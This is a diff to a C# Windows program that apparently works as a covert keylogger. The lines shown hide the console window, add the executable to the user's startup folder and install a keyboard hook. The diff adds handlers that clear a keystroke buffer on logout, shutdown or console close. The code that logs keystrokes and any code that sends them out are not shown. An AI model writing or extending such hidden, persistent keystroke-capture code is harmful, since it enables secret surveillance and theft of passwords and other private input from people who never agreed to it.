@@ -1,4 +1,5 @@
-﻿using Windows.Win32;
+﻿using Microsoft.Win32;
+using Windows.Win32;
 using Windows.Win32.Foundation;
 using Windows.Win32.UI.WindowsAndMessaging;
 using IWshRuntimeLibrary;
@@ -16,6 +17,16 @@ public static class Program
 
     public static unsafe void Main()
     {
+        // user logout/system shutdown events
+        SystemEvents.SessionEnding += (_, _) =>
+        {
+            _ = CleanupHandler();
+        };
+        // ctrl+c, ctrl+break, program close events
+        // could use this to handle logout/shutdown but its much easier to use SystemEvents.SessionEnding because
+        // https://learn.microsoft.com/en-us/windows/console/setconsolectrlhandler#remarks
+        PInvoke.SetConsoleCtrlHandler(CleanupHandler, true);
+        
         HideWindow();
         AddToStartup();
 
@@ -66,6 +77,17 @@ public static class Program
 
         return PInvoke.CallNextHookEx(_kbHook, code, wParam, lParam);
     }
+    
+    /// <summary>
+    /// Handler for SetConsoleCtrlHandler. Cleanup when program is closing.
+    /// </summary>
+    /// <param name="ctrlType"></param>
+    /// <returns></returns>
+    private static BOOL CleanupHandler(uint ctrlType = 7)
+    {
+        Buffer.Clear();
+        return true;
+    }
 
     /// <summary>
     ///     Hides current console window.
@@ -76,6 +98,9 @@ public static class Program
         PInvoke.ShowWindow(hWnd, SHOW_WINDOW_CMD.SW_HIDE);
     }
 
+    /// <summary>
+    /// Adds a shortcut to the executable to user's startup folder.
+    /// </summary>
     private static void AddToStartup()
     {
         var startupFolderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
